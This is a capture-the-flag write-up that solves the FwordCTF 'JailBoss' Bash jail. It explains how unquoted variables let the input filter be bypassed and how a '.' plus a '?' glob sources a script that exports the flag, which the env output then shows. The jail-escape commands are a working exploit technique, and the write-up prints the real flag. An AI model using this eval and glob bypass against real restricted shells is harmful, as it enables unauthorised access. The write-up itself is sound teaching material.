# JailBoss (Bash)

When we connect with ssh, we are placed in what seems like some sort of very restricted shell. We are provided with the source code for this shell in `jail.sh`:
```bash
#!/bin/bash
figlet "BASH JAIL x Fword"
echo "Welcome! Kudos to Anis_Boss Senpai"
function a(){
/usr/bin/env
}
export -f a
function calculSlash(){
	echo $1|grep -o "/"|wc -l
}
function calculPoint(){
	echo $1|grep -o "."|wc -l
}
function calculA(){
        echo $1|grep -o "a"|wc -l
}

while true;do
read -p ">> " input ;
if echo -n "$input"| grep -v -E "^(\.|\/| |\?|a)*$" ;then
        echo "No No not that easy "
else
	pts=$(calculPoint $input)
	slash=$(calculSlash $input)
	nbA=$(calculA $input)
	if [[ $pts -gt 2 || $slash -gt 1 || $nbA -gt 1 ]];then
		echo "That's Too much"
	else
		eval "$input"
	fi
fi
done
```
We also have `taskFword.sh` located in the directory where we connect to, and we are provided with its contents:
```bash
#!/bin/bash
export FLAG="FwordCTF{REDACTED}"
echo "A useless script for a useless SysAdmin"
```
We can see that the only way we can do anything is by getting the shell to run the `eval` statement. But in order to do that our input must be composed of only the characters `./ ?a`. Furthermore, on first glance it seems that we can only have at most 2 `.`s, one `/`, and one `a`. On further inspection, we realize that the regex `.` when passed to `grep` actually matches any character, so it seems like we can only have at most 2 characters total.

[ShellCheck](https://github.com/koalaman/shellcheck) is a great tool for finding bugs in shell scripts. And it's written in Haskell, which is cool. Anyways, when we run ShellCheck on `jail.sh`, we get (among other warnings):
```
In jail.sh line 23:
        pts=$(calculPoint $input)
                          ^----^ SC2086: Double quote to prevent globbing and word splitting.

Did you mean: 
        pts=$(calculPoint "$input")


In jail.sh line 24:
        slash=$(calculSlash $input)
                            ^----^ SC2086: Double quote to prevent globbing and word splitting.

Did you mean: 
        slash=$(calculSlash "$input")


In jail.sh line 25:
        nbA=$(calculA $input)
                      ^----^ SC2086: Double quote to prevent globbing and word splitting.

Did you mean: 
        nbA=$(calculA "$input")
```

If you're unfamiliar, globbing is a Bash feature which allows you to use wildcards like `*` to match files and expands to a space-separated list of matching files, and word splitting is when a variable is expanded into multiple arguments by splitting on whitespace. In this case, we see that the `calcul*` functions (example of globbing right there) only check the variable `$1`, which is the first argument, which means after word splitting, the program will only apply the character limit restrictions to the first word in the input. Since our input is a bash command, this means the first word is the name of the command and the rest are arguments, which can be any length.

Now we look for Bash commands under two characters which are composed of those five characters. Pretty much the only one is the `.` command. The `.` command does the same thing as `source`, which runs the given script in the context of the current shell environment. This means any environment variables set in the script will be visible in the current shell after running the script. Well, we helpfully have a script which sets a variable containing the flag, `taskFword.sh`, and a way to read environment variables, the `a` function. Now all we need to do is figure out how to pass the `taskFword.sh` file to `.`.

Looking at our allowed characters, we see that `?` is a glob wildcard which matches any *one* character. So, the input `????????????` will match `taskFword.sh` (and any other file with a 12 character name). Let's try it.
```
>> . ????????????
A useless script for a useless SysAdmin
```
It seems like `taskFword.sh` was executed, which means the `FLAG` variable is set. Now all we have to do is run `a` to see it.
```
>> a
SHELL=/opt/jail.sh
PWD=/home/ctf
LOGNAME=ctf
MOTD_SHOWN=pam
HOME=/home/ctf/
LANG=C.UTF-8
SSH_CONNECTION=219.85.133.95 50300 172.17.0.2 1234
FLAG=FwordCTF{BasH_1S_R3aLLy_4w3s0m3_K4hLaFTW}
TERM=xterm-256color
USER=ctf
SHLVL=1
SSH_CLIENT=219.85.133.95 50300 1234
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
SSH_TTY=/dev/pts/17
BASH_FUNC_a%%=() {  /usr/bin/env
}
_=/usr/bin/env
```
